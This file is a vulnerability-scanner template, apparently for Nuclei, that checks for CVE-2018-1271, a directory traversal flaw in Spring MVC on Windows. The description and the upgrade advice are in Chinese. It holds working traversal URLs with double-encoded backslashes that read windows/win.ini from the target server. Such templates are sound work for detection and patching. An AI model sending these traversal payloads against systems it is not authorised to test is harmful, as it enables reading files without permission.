id: CVE-2018-1271
info:
  name: Spring MVC Directory Traversal Vulnerability
  author:
  - l0ne1y
  description: |-
    SpringMVC 目录穿越漏洞
    2018年04月05日，Pivotal公布了Spring MVC存在一个目录穿越漏洞(CVE-2018-1271)。Spring Framework版本5.0到5.0.4,4.3到4.3.14以及较旧的不受支持的版本允许应用程序配置Spring MVC以提供静态资源（例如CSS，JS，图像）。当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。
  severity: medium
  remediation: |-
    #### 官方修复方案：
    Spring Framework 5.*（5.0到5.0.4）版本，建议更新到5.0.5版本。
    Spring Framework 4.3.*（4.3到4.3.14）版本，建议更新到4.3.15版本。
    不再受支持的旧版本，建议更新到4.3.15版本或5.0.5版本。
requests:
- matchers:
  - type: word
    words:
    - for 16-bit app support
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
  - '{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
  method: GET
